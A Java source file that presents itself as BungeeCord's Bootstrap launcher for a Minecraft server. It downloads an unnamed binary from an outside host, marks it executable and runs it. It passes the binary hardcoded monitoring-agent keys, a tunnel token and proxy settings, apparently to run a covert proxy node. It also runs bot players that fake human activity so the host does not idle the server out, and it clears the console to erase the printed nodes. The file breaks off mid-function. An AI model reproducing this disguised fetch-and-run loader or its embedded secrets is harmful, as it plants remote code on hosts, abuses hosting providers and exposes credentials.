package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process minecraftProcess;
    private static List<Thread> fakePlayerThreads = new ArrayList<>();
    private static final Random random = new Random();
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ACTIVITY", "FAKE_PLAYER_COUNT"
    };

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            Map<String, String> config = loadEnvVars();
            
            runSbxBinary(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
            
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(30000);
            }
            
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBots(config);
            }
            
            System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
        
        while (running.get()) {
            try {
                Thread.sleep(30000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }
    
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        
        envVars.put("UUID", "c813dfde-34e6-4c8d-bb97-1fb11295e837");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "play.svip888.us.kg");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiNGVhOGVlOWEtYTljNC00ODRhLWI4YmMtYjVlNjI0NjcyMDk3IiwicyI6IlpqYzFZVFEwTjJNdE5qYzRNaTAwTjJRd0xUazBNak10TlRsaVlUTXhNR1l5WkdGbCJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "俄罗斯");
        envVars.put("DISABLE_ARGO", "false");
        
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "");
        envVars.put("FAKE_PLAYER_ENABLED", "true");
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        envVars.put("FAKE_PLAYER_ACTIVITY", "low");
        envVars.put("FAKE_PLAYER_COUNT", "5");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
        
        return envVars;
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (minecraftProcess != null && minecraftProcess.isAlive()) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
            minecraftProcess.destroy();
            try {
                minecraftProcess.waitFor(10, java.util.concurrent.TimeUnit.SECONDS);
            } catch (InterruptedException e) {}
        }
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        for (Thread thread : fakePlayerThreads) {
            if (thread != null && thread.isAlive()) {
                thread.interrupt();
            }
        }
        if (!fakePlayerThreads.isEmpty()) {
            System.out.println(ANSI_YELLOW + "[FakePlayer] Stopped all bots" + ANSI_RESET);
        }
    }
    
    // ==================== Minecraft Server Functions ====================
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jarName = config.get("MC_JAR");
        return jarName != null && !jarName.trim().isEmpty();
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName = config.get("MC_JAR");
        String memory = config.getOrDefault("MC_MEMORY", "512M");
        String extraArgs = config.getOrDefault("MC_ARGS", "");
        
        String mcPortStr = config.get("MC_PORT");
        int mcPort = 25565;
        if (mcPortStr != null && !mcPortStr.trim().isEmpty()) {
            try {
                mcPort = Integer.parseInt(mcPortStr.trim());
            } catch (NumberFormatException e) {
                System.out.println(ANSI_YELLOW + "[MC-Server] Invalid MC_PORT, using default: 25565" + ANSI_RESET);
            }
        }
        
        config.put("MC_PORT", String.valueOf(mcPort));
        
        if (!memory.matches("\\d+[MG]")) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Invalid memory format, using default: 512M" + ANSI_RESET);
            memory = "512M";
        }
        
        Path jarPath = Paths.get(jarName);
        if (!Files.exists(jarPath)) {
            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET);
            System.out.println(ANSI_YELLOW + "[MC-Server] Skipping Minecraft server startup" + ANSI_RESET);
            return;
        }
        
        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath)) {
            System.out.println(ANSI_GREEN + "[MC-Server] Creating eula.txt (auto-accepting)" + ANSI_RESET);
            Files.write(eulaPath, "eula=true".getBytes());
        } else {
            String eulaContent = new String(Files.readAllBytes(eulaPath));
            if (!eulaContent.contains("eula=true")) {
                Files.write(eulaPath, "eula=true".getBytes());
            }
        }
        
        Path propPath = Paths.get("server.properties");
        String props = "";
        
        if (Files.exists(propPath)) {
            props = new String(Files.readAllBytes(propPath));
        } else {
            System.out.println(ANSI_GREEN + "[MC-Server] Creating server.properties" + ANSI_RESET);
            props = "server-port=" + mcPort + "\nonline-mode=false\n";
            Files.write(propPath, props.getBytes());
        }
        
        if (props.contains("server-port=")) {
            props = props.replaceAll("server-port=\\d+", "server-port=" + mcPort);
        } else {
            props += "\nserver-port=" + mcPort + "\n";
        }
        
        if (props.contains("online-mode=true")) {
            System.out.println(ANSI_GREEN + "[MC-Server] Setting online-mode=false for fake player support" + ANSI_RESET);
            props = props.replace("online-mode=true", "online-mode=false");
        } else if (!props.contains("online-mode=")) {
            props += "online-mode=false\n";
        }
        
        if (props.contains("player-idle-timeout=")) {
            props = props.replaceAll("player-idle-timeout=\\d+", "player-idle-timeout=0");
        } else {
            props += "player-idle-timeout=0\n";
        }
        
        Files.write(propPath, props.getBytes());
        
        System.out.println(ANSI_GREEN + "\n=== Starting Minecraft Server ===" + ANSI_RESET);
        System.out.println(ANSI_GREEN + "JAR: " + jarName + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Memory: " + memory + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Port: " + mcPort + ANSI_RESET);
        
        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        
        if (!extraArgs.trim().isEmpty()) {
            cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        }
        
        int memoryMB = parseMemory(memory);
        if (memoryMB >= 2048) {
            cmd.add("-XX:+UseG1GC");
            cmd.add("-XX:+ParallelRefProcEnabled");
            cmd.add("-XX:MaxGCPauseMillis=200");
            cmd.add("-XX:+UnlockExperimentalVMOptions");
            cmd.add("-XX:+DisableExplicitGC");
        } else if (memoryMB >= 1024) {
            cmd.add("-XX:+UseG1GC");
            cmd.add("-XX:MaxGCPauseMillis=200");
            cmd.add("-XX:+DisableExplicitGC");
        } else {
            cmd.add("-XX:+UseSerialGC");
            cmd.add("-XX:+DisableExplicitGC");
        }
        
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        
        minecraftProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println("[MC-Server] " + line);
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(3000);
        if (!minecraftProcess.isAlive()) {
            System.out.println(ANSI_RED + "[MC-Server] Failed to start! Exit code: " + 
                             minecraftProcess.exitValue() + ANSI_RESET);
        } else {
            System.out.println(ANSI_GREEN + "[MC-Server] ✓ Started successfully on port " + mcPort + ANSI_RESET);
        }
    }
    
    private static int parseMemory(String memory) {
        try {
            memory = memory.toUpperCase().trim();
            if (memory.endsWith("G")) {
                return Integer.parseInt(memory.substring(0, memory.length() - 1)) * 1024;
            } else if (memory.endsWith("M")) {
                return Integer.parseInt(memory.substring(0, memory.length() - 1));
            }
        } catch (Exception e) {}
        return 512;
    }
    
    // ==================== Fake Player Functions ====================
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }
    
    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status on port " + mcPort + "..." + ANSI_RESET);
        
        for (int i = 0; i < 60; i++) {
            try {
                Thread.sleep(5000);
                
                try (Socket testSocket = new Socket()) {
                    testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server port " + mcPort + " is ready!" + ANSI_RESET);
                    Thread.sleep(10000);
                    return;
                }
            } catch (Exception e) {
                if (i % 6 == 0) {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Still waiting... (" + (i * 5) + "s)" + ANSI_RESET);
                }
            }
        }
        
        System.out.println(ANSI_RED + "[FakePlayer] Warning: Timeout, trying anyway..." + ANSI_RESET);
    }
    
    private static int getMcPort(Map<String, String> config) {
        String portStr = config.get("MC_PORT");
        if (portStr == null || portStr.trim().isEmpty()) {
            return 25565;
        }
        
        try {
            return Integer.parseInt(portStr.trim());
        } catch (NumberFormatException e) {
            System.out.println(ANSI_YELLOW + "[FakePlayer] Invalid MC_PORT, using default: 25565" + ANSI_RESET);
            return 25565;
        }
    }
    
    private static void startFakePlayerBots(Map<String, String> config) {
        String basePlayerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);
        String activityLevel = config.getOrDefault("FAKE_PLAYER_ACTIVITY", "low");
        
        // 获取假人数量，默认为1
        int playerCount = 1;
        String countStr = config.get("FAKE_PLAYER_COUNT");
        if (countStr != null && !countStr.trim().isEmpty()) {
            try {
                playerCount = Integer.parseInt(countStr.trim());
                if (playerCount < 1) playerCount = 1;
                if (playerCount > 10) {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Warning: Player count limited to 10 (requested: " + playerCount + ")" + ANSI_RESET);
                    playerCount = 10;
                }
            } catch (NumberFormatException e) {
                System.out.println(ANSI_YELLOW + "[FakePlayer] Invalid FAKE_PLAYER_COUNT, using default: 1" + ANSI_RESET);
            }
        }

        System.out.println(ANSI_GREEN + "\n=== Starting Fake Player Bots ===" + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Count: " + playerCount + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Base Name: " + basePlayerName + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Target: 127.0.0.1:" + mcPort + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Protocol: 1.21.4 (774)" + ANSI_RESET);
        System.out.println(ANSI_GREEN + "Activity Level: " + activityLevel.toUpperCase() + ANSI_RESET);

        // 为每个假人创建一个线程，使用递增延迟启动
        for (int i = 0; i < playerCount; i++) {
            final int playerIndex = i;
            final String playerName = playerCount == 1 ? basePlayerName : basePlayerName + (i + 1);
            final int startDelay = i * 5000; // 每个假人延迟5秒启动
            
            Thread botThread = new Thread(() -> {
                try {
                    // 等待启动延迟
                    if (startDelay > 0) {
                        System.out.println(ANSI_YELLOW + "[FakePlayer-" + playerName + "] Starting in " + (startDelay/1000) + "s..." + ANSI_RESET);
                        Thread.sleep(startDelay);
                    }
                    
                    runFakePlayerBot(playerName, playerIndex, mcPort, activityLevel);
                } catch (InterruptedException e) {
                    System.out.println(ANSI_YELLOW + "[FakePlayer-" + playerName + "] Interrupted during startup" + ANSI_RESET);
                }
            });
            
            botThread.setDaemon(true);
            botThread.start();
            fakePlayerThreads.add(botThread);
        }
    }
    
    private static void runFakePlayerBot(String playerName, int playerIndex, int mcPort, String activityLevel) {
        while (running.get()) {
            Socket socket = null;
            int heartbeatCount = 0;
            int actionCount = 0;
            long sessionStartTime = System.currentTimeMillis();
            
            try {
                System.out.println(ANSI_YELLOW + "[FakePlayer-" + playerName + "] Connecting..." + ANSI_RESET);

                socket = new Socket();
                socket.setReceiveBufferSize(10 * 1024 * 1024);
                socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                socket.setSoTimeout(5000);

                DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                // Handshake
                ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                writeVarInt(handshake, 0x00);
                writeVarInt(handshake, 774);
                writeString(handshake, "127.0.0.1");
                handshake.writeShort(mcPort);
                writeVarInt(handshake, 2);
                byte[] handshakeData = handshakeBuf.toByteArray();
                writeVarInt(out, handshakeData.length);
                out.write(handshakeData);
                out.flush();

                // Login
                ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                DataOutputStream login = new DataOutputStream(loginBuf);
                writeVarInt(login, 0x00);
                writeString(login, playerName);
                UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                login.writeLong(playerUUID.getMostSignificantBits());
                login.writeLong(playerUUID.getLeastSignificantBits());
                byte[] loginData = loginBuf.toByteArray();
                writeVarInt(out, loginData.length);
                out.write(loginData);
                out.flush();

                System.out.println(ANSI_GREEN + "[FakePlayer-" + playerName + "] ✓ Handshake & Login sent" + ANSI_RESET);

                boolean configPhase = false;
                boolean playPhase = false;
                boolean compressionEnabled = false;
                int compressionThreshold = -1;
                
                // 玩家位置追踪 - 使用初始坐标，不等待服务器同步
                double playerX = -200.0 + (random.nextDouble() * 40 - 20); // -220 到 -180 随机
                double playerY = 70.0 + random.nextInt(20); // 70-90 随机高度
                double playerZ = -100.0 + (random.nextDouble() * 40 - 20); // -120 到 -80 随机
                boolean positionReceived = true; // 直接标记为true，不等待同步
                
                System.out.println(ANSI_YELLOW + "[FakePlayer-" + playerName + "] Initial position: " +
                    String.format("(%.1f, %.1f, %.1f)", playerX, playerY, playerZ) + ANSI_RESET);
                
                long lastActivityTime = System.currentTimeMillis();
                long lastMajorActionTime = System.currentTimeMillis();

                while (running.get() && !socket.isClosed()) {
                    try {
                        if (in.available() == 0) {
                            Thread.sleep(100);
                            continue;
                        }
                        
                        int packetLength = readVarInt(in);
                        if (packetLength < 0 || packetLength > 100000000) {
                            throw new IOException("Bad packet size");
                        }

                        byte[] packetData = null;
                        
                        if (compressionEnabled) {
                            int dataLength = readVarInt(in);
                            int compressedLength = packetLength - getVarIntSize(dataLength);
                            byte[] compressedData = new byte[compressedLength];
                            in.readFully(compressedData);

                            if (dataLength == 0) {
                                packetData = compressedData;
                            } else if (dataLength <= 8192) {
                                java.util.zip.Inflater inflater = new java.util.zip.Inflater();
                                inflater.setInput(compressedData);
                                packetData = new byte[dataLength];
                                inflater.inflate(packetData);
                                inflater.end();
                            }
                        } else {
                            packetData = new byte[packetLength];
                            in.readFully(packetData);
                        }

                        if (packetData == null) continue;

                        ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
                        DataInputStream packetIn = new DataInputStream(packetStream);
                        int packetId = readVarInt(packetIn);

                        if (!playPhase) {
                            if (!configPhase) {
                                // Login Phase
                                if (packetId == 0x03) {
                                    compressionThreshold = readVarInt(packetIn);
                                    compressionEnabled = compressionThreshold >= 0;
                                    System.out.println(ANSI_YELLOW + "[FakePlayer-" + playerName + "] Compression: " + compressionThreshold + ANSI_RESET);
                                } else if (packetId == 0x02) {
                                    System.out.println(ANSI_GREEN + "[FakePlayer-" + playerName + "] ✓ Login Success" + ANSI_RESET);
                                    ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                    DataOutputStream ack = new DataOutputStream(ackBuf);
                                    writeVarInt(ack, 0x03);
                                    sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    configPhase = true;

                                    // Send Client Information
                                    ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                    DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                    writeVarInt(info, 0x00);
                                    writeString(info, "en_US");
                                    info.writeByte(10);
                                    writeVarInt(info, 0);
                                    info.writeBoolean(true);
                                    info.writeByte(127);
                                    writeVarInt(info, 1);
                                    info.writeBoolean(false);
                                    info.writeBoolean(true);
                                    writeVarInt(info, 0);
                                    sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                }
                            } else {
                                // Config Phase
                                if (packetId == 0x03) {
                                    System.out.println(ANSI_GREEN + "[FakePlayer-" + playerName + "] ✓ Config Finished, entering Play phase..." + ANSI_RESET);
                                    ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                    DataOutputStream ack = new DataOutputStream(ackBuf);
                                    writeVarInt(ack, 0x03);
                                    sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    playPhase = true;
                                    heartbeatCount = 0;
                                } else if (packetId == 0x04 && packetIn.available() >= 8) {
                                    long id = packetIn.readLong();
                                    ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                    DataOutputStream ack = new DataOutputStream(ackBuf);
                                    writeVarInt(ack, 0x04);
                                    ack.writeLong(id);
                                    sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                } else if (packetId == 0x0E) {
                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                    DataOutputStream bufOut = new DataOutputStream(buf);
                                    writeVarInt(bufOut, 0x07);
                                    writeVarInt(bufOut, 0);
                                    sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                }
                            }
                        } else {
                            // Play Phase
                            long currentTime = System.currentTimeMillis();
                            
                            // 尝试接收位置包更新（可选，不影响活动）
                            if ((packetId == 0x3E || packetId == 0x3D || packetId == 0x40 || packetId == 0x3C) && packetIn.available() >= 24) {
                                try {
                                    double newX = packetIn.readDouble();
                                    double newY = packetIn.readDouble();
                                    double newZ = packetIn.readDouble();
                                    // 更新位置
                                    playerX = newX;
                                    playerY = newY;
                                    playerZ = newZ;
                                    if (heartbeatCount == 12) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer-" + playerName + "] ✓ Position updated: " +
                                            String.format("(%.1f, %.1f, %.1f)", playerX, playerY, playerZ) + ANSI_RESET);
                                    }
                                } catch (Exception e) {
                                    // 忽略位置读取错误
                                }
                            }
                            
                            // Detect and respond to KeepAlive packets
                            if (packetId >= 0x20 && packetId <= 0x30 && packetIn.available() == 8) {
                                long keepAliveId = packetIn.readLong();
                                heartbeatCount++;
                                
                                if (heartbeatCount % 20 == 0) { // 只每20次心跳打印一次
                                    System.out.println(ANSI_GREEN + "[FakePlayer-" + playerName + "] ♥ Heartbeat #" + heartbeatCount + 
                                        " [Actions: " + actionCount + "]" + ANSI_RESET);
                                }
                                
                                // Reply to KeepAlive
                                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                DataOutputStream bufOut = new DataOutputStream(buf);
                                writeVarInt(bufOut, 0x1B);
                                bufOut.writeLong(keepAliveId);
                                sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                
                                // 偶尔发送微小的视角抖动（模拟真人细微移动）
                                if (heartbeatCount >= 10 && random.nextInt(10) == 0) {
                                    ByteArrayOutputStream microBuf = new ByteArrayOutputStream();
                                    DataOutputStream micro = new DataOutputStream(microBuf);
                                    writeVarInt(micro, 0x1F);
                                    // 非常微小的随机角度变化
                                    micro.writeFloat((float)(random.nextGaussian() * 0.5));
                                    micro.writeFloat((float)(random.nextGaussian() * 0.3));
                                    micro.writeBoolean(true);
                                    sendPacket(out, microBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                }
                                
                                // 等待10个心跳后开始活动（不再等待位置同步）
                                if (heartbeatCount >= 10) {
                                    // 缩短间隔到30秒-1.5分钟，更频繁的活动
                                    long baseInterval = 30000; // 30秒基础
                                    long randomExtra = random.nextInt(60000); // 0-60秒随机
                                    long activityInterval = baseInterval + randomExtra;
                                    long playerOffset = playerIndex * 10000L; // 10秒偏移（更密集）
                                    
                                    if (currentTime - lastMajorActionTime - playerOffset > activityInterval) {
                                        performMajorActivity(out, compressionEnabled, compressionThreshold, playerName, playerIndex, 
                                            playerX, playerY, playerZ);
                                        actionCount++;
                                        lastMajorActionTime = currentTime;
                                        lastActivityTime = currentTime;
                                    }
                                }
                            }
                            
                            // Disconnect packet
                            if (packetId == 0x1D) {
                                System.out.println(ANSI_RED + "[FakePlayer-" + playerName + "] Kicked. Session lasted: " + 
                                    ((currentTime - sessionStartTime) / 1000) + "s, Actions: " + actionCount + ANSI_RESET);
                                break;
                            }
                        }

                    } catch (java.net.SocketTimeoutException e) {
                        Thread.sleep(100);
                        continue;
                    } catch (Exception e) {
                        System.out.println(ANSI_RED + "[FakePlayer-" + playerName + "] Packet error: " + e.getMessage() + ANSI_RESET);
                        break;
                    }
                }

                if (socket != null && !socket.isClosed()) {
                    try { socket.close(); } catch (Exception e) {}
                }
                System.out.println(ANSI_YELLOW + "[FakePlayer-" + playerName + "] Session ended. Total actions: " + actionCount + ANSI_RESET);
                System.out.println(ANSI_YELLOW + "[FakePlayer-" + playerName + "] Reconnecting in 30s..." + ANSI_RESET);
                Thread.sleep(30000);

            } catch (java.net.ConnectException e) {
                System.out.println(ANSI_YELLOW + "[FakePlayer-" + playerName + "] Server offline, retrying in 60s..." + ANSI_RESET);
                try { Thread.sleep(60000); } catch (InterruptedException ex) { break; }
            } catch (InterruptedException e) {
                break;
            } catch (Exception e) {
                System.out.println(ANSI_YELLOW + "[FakePlayer-" + playerName + "] Connection error: " + e.getMessage() + ANSI_RESET);
                try { Thread.sleep(30000); } catch (InterruptedException ex) { break; }
            }
        }
    }
    
    private static void performMajorActivity(DataOutputStream out, boolean compress, int threshold, 
                                             String playerName, int playerIndex, double x, double y, double z) {
        try {
            // 随机选择活动类型（只使用视角旋转，避免协议错误）
            int activityType = random.nextInt(3);
            
            if (activityType == 0) {
                // 活动1: 快速环视（模拟寻找东西）
                System.out.println(ANSI_GREEN + "[FakePlayer-" + playerName + "] ★ ACTIVITY: Quick look around" + ANSI_RESET);
                
                int looks = 5 + random.nextInt(8); // 5-12次快速转头
                for (int i = 0; i < looks; i++) {
                    Thread.sleep(200 + random.nextInt(400)); // 200-600ms
                    
                    float yaw = random.nextFloat() * 360;
                    float pitch = (random.nextFloat() * 50) - 25; // -25到+25度
                    
                    ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
                    DataOutputStream rot = new DataOutputStream(rotBuf);
                    writeVarInt(rot, 0x1F);
                    rot.writeFloat(yaw);
                    rot.writeFloat(pitch);
                    rot.writeBoolean(true);
                    sendPacket(out, rotBuf.toByteArray(), compress, threshold);
                }
                
            } else if (activityType == 1) {
                // 活动2: 慢速360度旋转（看风景）
                System.out.println(ANSI_GREEN + "[FakePlayer-" + playerName + "] ★ ACTIVITY: Smooth 360° rotation" + ANSI_RESET);
                
                int steps = 12 + random.nextInt(12); // 12-24步完成360度
                float baseYaw = random.nextFloat() * 360;
                for (int i = 0; i < steps; i++) {
                    Thread.sleep(400 + random.nextInt(400)); // 400-800ms
                    
                    float yaw = (baseYaw + (i * 360f / steps)) % 360f;
                    float pitch = (float)(Math.sin(i * 0.5) * 15); // -15到+15度波动
                    
                    ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
                    DataOutputStream rot = new DataOutputStream(rotBuf);
                    writeVarInt(rot, 0x1F);
                    rot.writeFloat(yaw);
                    rot.writeFloat(pitch);
                    rot.writeBoolean(true);
                    sendPacket(out, rotBuf.toByteArray(), compress, threshold);
                }
                
            } else {
                // 活动3: 上下左右快速扫视
                System.out.println(ANSI_GREEN + "[FakePlayer-" + playerName + "] ★ ACTIVITY: Scanning around" + ANSI_RESET);
                
                float baseYaw = random.nextFloat() * 360;
                int scans = 6 + random.nextInt(6); // 6-11次扫视
                
                for (int i = 0; i < scans; i++) {
                    Thread.sleep(300 + random.nextInt(500)); // 300-800ms
                    
                    // 左右扫视
                    float yaw = baseYaw + (random.nextFloat() * 120 - 60); // ±60度范围
                    // 上下看
                    float pitch = (random.nextFloat() * 70) - 35; // -35到+35度
                    
                    ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
                    DataOutputStream rot = new DataOutputStream(rotBuf);
                    writeVarInt(rot, 0x1F);
                    rot.writeFloat(yaw);
                    rot.writeFloat(pitch);
                    rot.writeBoolean(true);
                    sendPacket(out, rotBuf.toByteArray(), compress, threshold);
                }
            }
            
            // 活动结束后，随机发送几次微小抖动（模拟真人调整）
            Thread.sleep(500);
            for (int i = 0; i < 2 + random.nextInt(3); i++) {
                Thread.sleep(100 + random.nextInt(200));
                
                ByteArrayOutputStream microBuf = new ByteArrayOutputStream();
                DataOutputStream micro = new DataOutputStream(microBuf);
                writeVarInt(micro, 0x1F);
                micro.writeFloat((float)(random.nextGaussian() * 2));
                micro.writeFloat((float)(random.nextGaussian() * 1.5));
                micro.writeBoolean(true);
                sendPacket(out, microBuf.toByteArray(), compress, threshold);
            }
            
            System.out.println(ANSI_GREEN + "[FakePlayer-" + playerName + "] ★ Activity completed" + ANSI_RESET);
            
        } catch (Exception e) {
            System.out.println(ANSI_RED + "[FakePlayer-" + playerName + "] Activity error: " + e.getMessage() + ANSI_RESET);
        }
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        do {
            size++;
            value >>>= 7;
        } while (value != 0);
